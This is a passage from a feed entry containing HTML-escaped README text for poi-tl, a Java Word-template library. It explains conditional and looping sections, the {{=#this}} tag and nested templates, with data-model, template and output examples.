it,Ma!&#xA;{{?announce}}&#xA;Top of the world!🎋&#xA;{{/announce}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Made it,Ma!&#xA;Made it,Ma!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Non-False Values and Not a collection&lt;/h4&gt; &#xA;&lt;p&gt;If the value of the section is not &lt;code&gt;null&lt;/code&gt;, &lt;code&gt;false&lt;/code&gt;, and is not a collection, all document elements in the section will be &lt;strong&gt;rendered once&lt;/strong&gt;, similar to the condition of the if statement is &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Datamodel:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;person&#34;: { &#34;name&#34;: &#34;Sayi&#34; }&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{?person}}&#xA;  Hi {{name}}!&#xA;{{/person}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  Hi Sayi!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Non-Empty collection&lt;/h4&gt; &#xA;&lt;p&gt;If the value of the section is a non-empty collection, the document elements in the section will be &lt;strong&gt;looped once or N times&lt;/strong&gt;, depending on the size of the collection, similar to the foreach syntax.&lt;/p&gt; &#xA;&lt;p&gt;Datamodel:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;songs&#34;: [&#xA;    { &#34;name&#34;: &#34;Memories&#34; },&#xA;    { &#34;name&#34;: &#34;Sugar&#34; },&#xA;    { &#34;name&#34;: &#34;Last Dance&#34; }&#xA;  ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{?songs}}&#xA;{{name}}&#xA;{{/songs}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Memories&#xA;Sugar&#xA;Last Dance&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In the loop, a special tag &lt;code&gt;{{=#this}}&lt;/code&gt; can be used to directly refer to the object of the current iteration.&lt;/p&gt; &#xA;&lt;p&gt;Datamodel:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;produces&#34;: [&#xA;    &#34;application/json&#34;,&#xA;    &#34;application/xml&#34;&#xA;  ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Template:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;{{?produces}}&#xA;{{=#this}}&#xA;{{/produces}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;application/json&#xA;application/xml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Nesting&lt;/h3&gt; &#xA;&lt;p&gt;Nesting is the merging of another Word template in a Word template, which can be understood as import, include or word document merging, marked with &lt;code&gt;+&lt;/code&gt;, such as &lt;code&gt;{{+nested}}&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;class AddrModel {&#xA;  String addr;&#xA;  public AddrModel(String addr) {&#xA;    this.addr = addr;&#xA;  }&#xA;}&#xA;&#xA;List&amp;lt;AddrModel&amp;gt; subData = new ArrayList&amp;lt;&amp;gt;();&#xA;subData.add(new AddrModel(&#34;Hangzhou,China&#34;));&#xA;subData.add(new AddrModel(&#34;Shanghai,China&#34;));&#xA;put(&#34;nested&#34;, Includes.ofLocal(&#34;sub.docx&#34;).setRenderModel(subData).create());&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Two Word Template:&lt;/p&gt; &#xA;&lt;p&gt;main.docx:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Hello, World&#xA;{{+nested}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;sub.docx:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Address: {{addr}}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Output:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Hello, World&#xA;Address: Hangzhou,China&#xA;Address: Shanghai,China&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Documentation and examples&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://deepoove.com/poi-tl&#34;&gt;中文文档&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#_%E8%BD%AF%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3&#34;&gt;Basic Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#example-table&#34;&gt;Table Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#example-animal&#34;&gt;Sections and chart Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#example-certificate&#34;&gt;Textbox Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#plugin-comment&#34;&gt;Comment Example&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#example-resume&#34;&gt;Example: Write Resume&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#plugin-highlight&#34;&gt;Example: Highlighting Code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#plugin-markdown&#34;&gt;Example: Convert Markdown to word&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://deepoove.com/poi-tl/#example-swagger&#34;&gt;Example: Convert Swagger to word&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For more examples and the source code of all examples, see JUnit testcases.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://deepoove.com/poi-tl/demo.png&#34; alt=&#34;&#34;&gt; &lt;img src=&#34;http://deepoove.com/poi-tl/demo_result.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;You can join this project in many ways, not limited to the following ways:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Feedback problems encountered in use&lt;/li&gt; &#xA; &lt;li&gt;Share the joy of success&lt;/li&gt; &#xA; &lt;li&gt;Update and improve documentation&lt;/li&gt; &#xA; &lt;li&gt;Solve and discuss issues&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;FAQ&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;http://deepoove.com/poi-tl/#_%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98&#34;&gt;FAQ&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>